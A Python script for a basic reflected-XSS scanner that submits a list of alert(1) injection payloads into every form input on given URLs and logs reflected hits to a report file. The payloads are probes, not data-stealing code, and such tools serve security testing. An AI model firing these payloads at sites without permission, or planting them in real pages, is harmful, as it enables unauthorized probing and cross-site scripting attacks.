import requests
from bs4 import BeautifulSoup
import sys

print("=========================================")
print("Welcome to Basic XSS Scanner\n")

args = sys.argv

if len(args) != 3:
    print("Usage: python xss_scanner.py -u <url> | -l <input.txt>")
    sys.exit(1)

if args[1] not in ["-u", "-l"]:
    print("Usage: python xss_scanner.py -u <url> | -l <input.txt>")
    sys.exit(1)

def xssscan(url):
    response = requests.get(url)
    html = response.text

    soup = BeautifulSoup(html, "html.parser")
    forms = soup.find_all("form")

    print(f"\nTarget: {url}")
    print(f"Total forms found: {len(forms)}")

    payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<a href=javascript:alert(1)>click</a>"
    ]

    for form in forms:
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")

        if action.startswith("http"):
            target_url = action
        else:
            target_url = requests.compat.urljoin(url, action)

        print("Action:", target_url)
        print("Method:", method)

        for payload in payloads:
            data = {}

            for input_tag in inputs:
                name = input_tag.get("name")
                if name:
                    data[name] = payload

            if method == "post":
                r = requests.post(target_url, data=data)
            else:
                r = requests.get(target_url, params=data)

            if payload in r.text:
                print("[!!!] XSS FOUND")
                print("Payload:", payload)
                print("Parameters Tested:", list(data.keys()))

                with open("xss_report.txt", "a") as f:
                    f.write(
                        f"XSS Found | URL: {target_url} | Payload: {payload} | Params: {list(data.keys())}\n"
                    )

if args[1] == "-u":
        xssscan(args[2])

elif args[1] == "-l":
    with open(args[2], "r") as f:
        urls = f.read().splitlines()
        for url in urls:
            if url.strip():
                xssscan(url)

print("\n=========================================")
print("Thanks for using Basic XSS Scanner")
print("Developed by sudo_0xksh")